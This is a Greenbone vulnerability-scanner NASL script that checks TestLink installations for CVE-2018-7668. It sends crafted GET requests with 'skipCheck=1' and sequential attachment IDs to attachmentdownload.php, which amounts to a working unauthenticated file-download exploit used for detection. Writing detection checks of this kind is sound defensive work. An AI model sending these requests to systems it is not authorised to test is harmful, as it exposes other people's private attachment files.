# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:testlink:testlink";

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113125");
  script_version("2021-12-14T13:34:30+0000");
  script_tag(name:"last_modification", value:"2021-12-14 13:34:30 +0000 (Tue, 14 Dec 2021)");
  script_tag(name:"creation_date", value:"2018-03-07 14:30:00 +0100 (Wed, 07 Mar 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-03-27 17:57:00 +0000 (Tue, 27 Mar 2018)");

  script_cve_id("CVE-2018-7668");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TestLink <= 1.9.16 Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_testlink_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("testlink/http/detected");

  script_tag(name:"summary", value:"TestLink is prone to an information vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"TestLink allows remote attackers to read arbitrary attachments
  via a modified ID field to /lib/attachments/attachmentdownload.php.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to access
  arbitrary attachment files.");

  script_tag(name:"affected", value:"TestLink versions through 1.9.16.");

  script_tag(name:"solution", value:"Update to version 1.9.17 or later.");

  script_xref(name:"URL", value:"http://lists.openwall.net/full-disclosure/2018/02/28/1");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/50578");
  script_xref(name:"URL", value:"https://nch.ninja/blog/unauthorized-file-download-attached-files-testlink-116-119/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

for( i = 1; i <= 5; i++ ) {
  url = dir + "/lib/attachments/attachmentdownload.php?skipCheck=1&id=" + i;

  req = http_get( port:port, item:url );
  res = http_keepalive_send_recv( port:port, data:req );

  body_pattern = "Downloading attachment</h1>";
  header1_pattern = 'Content-Disposition: inline; filename="';
  header2_pattern = 'Content-Description: Download Data';

  if( egrep( string:res, pattern:body_pattern, icase:TRUE ) ||
      ( egrep( string:res, pattern:header1_pattern, icase:TRUE ) &&
        egrep( string:res, pattern:header2_pattern, icase:TRUE ) ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
